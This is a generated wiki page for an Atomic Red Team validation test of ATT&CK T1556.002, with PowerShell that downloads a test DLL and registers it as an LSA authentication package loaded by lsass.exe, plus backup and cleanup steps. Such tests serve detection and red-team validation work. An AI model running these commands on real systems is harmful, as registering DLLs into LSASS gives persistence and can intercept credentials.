---
atomic_guid: "91580da6-bc6e-431b-8b88-ac77180005f2"
title: "Install Additional Authentication Packages"
framework: "atomic"
generated: "true"
attack_technique_id: "T1556.002"
attack_technique_name: "Modify Authentication Process: Password Filter DLL"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.002/T1556.002.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "91580da6-bc6e-431b-8b88-ac77180005f2"
  - "Install Additional Authentication Packages"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Install Additional Authentication Packages

lsass.exe loads all DLLs specified by the Authentication Packages REG_MULTI_SZ value.
Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.
The binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection
Source is in src folder. 
This does require a reboot to see the filter loaded into lsass.exe. 
It does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup.

## Metadata

- Atomic GUID: 91580da6-bc6e-431b-8b88-ac77180005f2
- Technique: T1556.002: Modify Authentication Process: Password Filter DLL
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1556.002/T1556.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1556-modify_authentication_process|T1556.002]]

## Input Arguments

### dll_name

- description: Name of the Password Filter
- type: string
- default: AtomicRedTeamPWFilter.dll

### dll_path

- description: Path to DLL to be installed and registered as additional authentication package
- type: path
- default: PathToAtomicsFolder\T1556.002\bin

## Dependencies

AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\#{dll_name})

### Prerequisite Check

```powershell
if (Test-Path "#{dll_path}\#{dll_name}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest "https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll" -OutFile "#{dll_path}\#{dll_name}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
$passwordFilterName = (Copy-Item "#{dll_path}\#{dll_name}" -Destination "C:\Windows\System32" -PassThru).basename
$lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
$AuthenticationPackagesValues = $lsaKey.GetValue("Authentication Packages")
$AuthenticationPackagesValues += $passwordFilterName
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Authentication Packages" $AuthenticationPackagesValues
```

### Cleanup

```powershell
reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"
remove-item C:\Windows\System32\#{dll_name}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.002/T1556.002.yaml)
